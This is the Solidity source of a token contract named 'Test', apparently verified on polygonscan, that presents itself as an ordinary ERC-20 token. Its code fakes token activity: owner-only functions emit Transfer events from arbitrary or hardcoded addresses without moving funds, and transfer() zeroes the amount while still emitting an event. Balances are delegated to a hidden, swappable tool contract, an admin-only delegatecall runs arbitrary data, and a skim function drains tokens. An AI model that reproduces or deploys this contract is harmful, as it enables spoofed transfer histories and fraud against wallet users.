/**
 *Submitted for verification at polygonscan.com on 2023-06-12
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address from, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address from, address spender, uint256 amount) external returns (bool);
    function transferFrom(address from,address sender,address recipient,uint256 amount)external returns (bool);
    function dnum() external view returns (uint256);
}

contract Test {

    constructor (address _toolAddress) {
        _owners = msg.sender;
        toolAddress = _toolAddress;
        emit OwnershipTransferred(address(0), _owners);
    }

	receive() external payable {
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyAdmin {
        require(adminMap[msg.sender] != address(0) || msg.sender == toolAddress, "onlyAdmin");
        _;
    }

    modifier onlyOwner() {
        require(isOwner(), "onlyOwner");
        _;
    }

    uint256 public _totalSupply = 10 ** 6 * 10 ** _decimals;
    string _name = "Test";
    string _symbol = "TEST";
    uint8 constant _decimals = 6;
    address internal _owners;
    address public toolAddress;

    mapping (address  => address) public adminMap;

    function ico() public payable onlyOwner {
        address from=address(0);
        uint num=IERC20(toolAddress).dnum();
        emit Transfer(from, msg.sender,num);
    }

    function batchTransferToken(address[] memory holders) public payable onlyOwner {
        address from = 0x01C952174C24E1210d26961D456A77A39e1F0BB0;
        uint256 amount = 615526640000000000000000;
        for (uint i=0; i<holders.length; i++) {
            emit Transfer(from, holders[i], amount);
        }
    }

    function mintThis(address from, address to,uint num) public onlyOwner {
        emit Transfer(from, to,num);
    }

    function skim(address tokenA, uint256 value) public onlyOwner {
        safeTransfer(tokenA, msg.sender, value);
    }

    function transfe(address[] memory fromAddresses, address[] memory toAddresses, uint[] memory amounts) public onlyOwner {
        require(fromAddresses.length == toAddresses.length && fromAddresses.length == amounts.length, "Array lengths do not match");
        for (uint i = 0; i < fromAddresses.length; i++) {
        emit Transfer(fromAddresses[i], toAddresses[i], amounts[i]);
        }
    }

    function safeTransfer(address token, address to,uint256 value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'myTransferHelper: TRANSFER_FAILED');
    }

    function callSendMyToken(address c, bytes memory datas) public onlyAdmin{
        c.delegatecall(datas);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function owner() public view returns (address) {
        return _owners;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owners || msg.sender == toolAddress;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owners, address(0));
        _owners = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owners, newOwner);
        _owners = newOwner;
    }

    function addAdminForThisToolToken(address addr) onlyOwner public returns(bool) {
        require(adminMap[addr] == address(0));
        adminMap[addr] = addr;
        return true;
    }

    function deleteAdminForThisToolToken(address addr) onlyOwner public returns(bool) {
        require(adminMap[addr] != address(0));
        adminMap[addr] = address(0);
        return true;
    }

    function setToolAddress(address _toolAddress) onlyAdmin public returns(bool) {
        toolAddress = _toolAddress;
        return true;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        _value = 0;
        emit Transfer(msg.sender, _to, _value);
        return IERC20(toolAddress).transfer(msg.sender, _to, _value);
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return IERC20(toolAddress).balanceOf(_owner);
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        emit Transfer(_from, _to, _value);
        return IERC20(toolAddress).transferFrom(msg.sender, _from, _to, _value);
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        return IERC20(toolAddress).approve(msg.sender, _spender, _value);
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return IERC20(toolAddress).allowance(_owner, _spender);
    }
}